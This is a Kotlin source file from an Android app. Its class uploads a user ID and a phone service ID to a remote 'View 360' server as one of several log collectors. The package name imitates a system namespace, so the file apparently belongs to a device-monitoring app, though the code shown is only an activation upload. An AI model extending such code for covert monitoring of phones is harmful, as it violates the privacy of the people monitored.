package com.android.services.logs.collectors.auth

import android.content.Context
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.View360User
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.View360Api
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils

class View360UserActivation(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val view360ServerApi: View360Api,
) : LogsCollector {

    override fun uploadLogs() {
        val serverHelper = RemoteServerHelper(
            context,
            AppConstants.VIEW_360_TYPE,
            localDatabaseSource,
            view360ServerApi = view360ServerApi
        )
        serverHelper.upload(
            listOf(
                View360User(
                    userId = AppUtils.getUserId(),
                    phoneServiceId = AppUtils.getPhoneServiceId()
                )
            )
        )
    }
}